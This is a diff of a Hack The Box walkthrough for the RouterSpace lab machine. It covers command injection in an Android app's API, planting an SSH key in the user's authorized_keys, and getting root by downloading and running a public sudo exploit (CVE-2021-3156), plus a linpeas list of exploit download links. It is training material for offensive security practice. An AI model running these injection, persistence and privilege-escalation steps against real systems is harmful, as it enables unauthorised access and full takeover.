@@ -1,10 +1,14 @@
-# Hackthebox - RouterSpace - Linux
+# Hackthebox - RouterSpace
 
-![](../.res/HTB-routerspace.png)
+- Linux
+
+![RouterSpace](../.res/HTB-routerspace.png)
+
+- [Box on HTB](https://app.hackthebox.com/machines/444)
 
 ## Nmap
 
-```
+```bash
 ┌──(root💀kali)-[~/Documents/hackthebox/routerspace]
 └─# nmap -T5 -sC -sV -O -Pn -p- 10.10.11.148
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-14 17:40 EDT
@@ -125,15 +129,137 @@ Nmap done: 1 IP address (1 host up) scanned in 74.49 seconds
 
 - We have this page  
 ![image](https://user-images.githubusercontent.com/96747355/168449299-c15f82ea-b67c-45c2-982a-48c2627af167.png)  
-- If we click on download we get and apk file:   
+- If we click on download we get and apk file  
 ![image](https://user-images.githubusercontent.com/96747355/168449318-3bedfdb3-1fcb-4593-8aff-c50f15f463c4.png)  
-- Let's open it with jadx-gui, there's nothing that stands out in the manifest
-- I am just going to try to lanch it from android studio  
+- Let's open it with jadx-gui. With the manifest we know that we can install in an Android from API 21 to API 30. `<uses-sdk android:minSdkVersion="21" android:targetSdkVersion="30"/>`
+
+- Let's see what we get if we launch it from an AVD  
 ![image](https://user-images.githubusercontent.com/96747355/168450143-67883500-437e-4c75-80da-95a480e97444.png)  
 - We click on next and we have a router we can check status  
 ![image](https://user-images.githubusercontent.com/96747355/168450166-7f2a9080-84a3-44e8-b9de-39955cfb7f30.png)  
-- I am also going to intercept the traffic using burp
-- So we have to launch it and set up a new proxy listener as follow  
-![image](https://user-images.githubusercontent.com/96747355/168450207-faa2b152-e1f1-4249-8941-160f2ed438a0.png)  
-- Our settings in Android studio should look like this:  
-![image](https://user-images.githubusercontent.com/96747355/168450223-67f75b7c-638d-4e3c-bf98-5f95f1c017dd.png)  
+- We need to launch burp and set it to intercept traffic from the avd. You can check my documentation on [Android here](../mobile-app/android.md) to see how to set this up.
+- We have an interesting request here. This happens when we click on the "Check status button  
+![request](../.res/2023-02-04-16-32-01.png)
+- We need to change our /etc/hosts file to be able to reach it `10.10.11.148	routerspace.htb`
+- Once our hosts file is modified here is what happens in burp
+
+![burp](../.res/2023-02-04-16-34-46.png)
+
+- If we send this to the repeater and try command injection we can actually execute commands on the server  
+
+![whoami](../.res/2023-02-04-16-47-09.png)
+
+- So we have a user `paul`
+- We can event grab the user flag this way
+
+![user](../.res/2023-02-04-16-48-38.png)
+
+- We have an `.ssh` folder in the home but it does not have a key
+- Let's get a reverse shell. I tried multiple command and was not successful to get a shell. It seems like there is a protection block of some sort.
+- The other option would be to generate a secret key and write it in the .ssh folder of Paul as we have access to it.
+- `ssh-keygen` we generate and ssh key I will name mine routerspace_rsa  
+
+![keygen](../.res/2023-02-05-10-10-45.png)  
+
+- So now we need to write it in the ssh folder using burp. We will have to escape double quotes for the command to actually work.  
+
+![authorized_keys](../.res/2023-02-05-10-20-04.png)  
+
+- We can cat it to make sure it worked  
+
+![cat key](../.res/2023-02-05-10-32-31.png)  
+
+- Now we should be able to log in with ssh using it. So I made a typo in for the filename make sure you name it `authorized_keys`, I modified it with mv.  
+- `ssh -i routerspace_rsa paul@10.10.11.148` now you should be able to login with ssh  
+
+![ssh](../.res/2023-02-05-10-41-54.png)  
+
+## Privilege escalation
+
+- Let's get linpeas `wget https://github.com/carlospolop/PEASS-ng/releases/download/20230205/linpeas_linux_amd64`
+- We will need to use scp because of the restrictions we had previously [here](https://csbygb.gitbook.io/pentips/post-exploitation/files-transfert#ssh-creds-needed) is an example on scp `scp FILE-TO-SEND user@ip:/path/to/folder` so in my case `scp -i routerspace_rsa linpeas_linux_amd64 paul@10.10.11.148:/home/paul` (we need to specify the key)
+- `chmod +x linpeas_linux_amd64` from the target we make our file executable
+- `./linpeas_linux_amd64` we can run it
+
+### Interesting output
+
+- So here is what we could investigate from our linpeas output
+
+```bash
+Vulnerable to CVE-2021-3560 # This one shows up as a 95% PE vector
+# It is also worth checking the other CVEs found by linpeas
+[+] [CVE-2022-2586] nft_object UAF
+
+   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
+   Exposure: probable
+   Tags: [ ubuntu=(20.04) ]{kernel:5.12.13}
+   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
+   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)
+
+[+] [CVE-2021-4034] PwnKit
+
+   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
+   Exposure: probable
+   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
+   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
+
+[+] [CVE-2021-3156] sudo Baron Samedit
+
+   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
+   Exposure: probable
+   Tags: mint=19,[ ubuntu=18|20 ], debian=10
+   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main
+
+[+] [CVE-2021-3156] sudo Baron Samedit 2
+
+   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
+   Exposure: probable
+   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
+   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main
+
+[+] [CVE-2021-22555] Netfilter heap out-of-bounds write
+
+   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
+   Exposure: probable
+   Tags: [ ubuntu=20.04 ]{kernel:5.8.0-*}
+   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
+   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
+   Comments: ip_tables kernel module must be loaded
+
+[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)
+
+   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
+https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
+   Exposure: less probable
+   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
+   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
+   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)
+
+[+] [CVE-2017-5618] setuid screen v4.5.0 LPE
+
+   Details: https://seclists.org/oss-sec/2017/q1/184
+   Exposure: less probable
+   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154
+
+╔══════════╣ Unix Sockets Listening
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets
+/home/paul/.pm2/pub.sock
+  └─(Read Write)
+/home/paul/.pm2/rpc.sock
+  └─(Read Write)
+╔══════════╣ Searching uncommon passwd files (splunk)
+passwd file: /etc/pam.d/passwd
+passwd file: /etc/passwd
+passwd file: /usr/share/bash-completion/completions/passwd
+passwd file: /usr/share/lintian/overrides/passwd
+```
+
+- The polkit CVE will not work because it needs Gnome-Control-Center which we do not have here.
+- Linpeas also mentions `CVE-2021-3156`. Let's get try with the poc from linepeas. [Here](https://github.com/blasty/CVE-2021-3156) are the steps.
+- No luck with this exploit, let's try another one and if it does not work we will try another CVE
+- Let's have a look at [this one](https://github.com/worawit/CVE-2021-3156)
+- `wget https://raw.githubusercontent.com/worawit/CVE-2021-3156/main/exploit_nss.py`
+- `scp -i routerspace_rsa exploit_nss.py paul@10.10.11.148:/home/paul`
+- `python3 exploit_nss.py` and this time it works. We can grab the root flag  
+
+![root flag](../.res/2023-02-05-12-21-19.png)
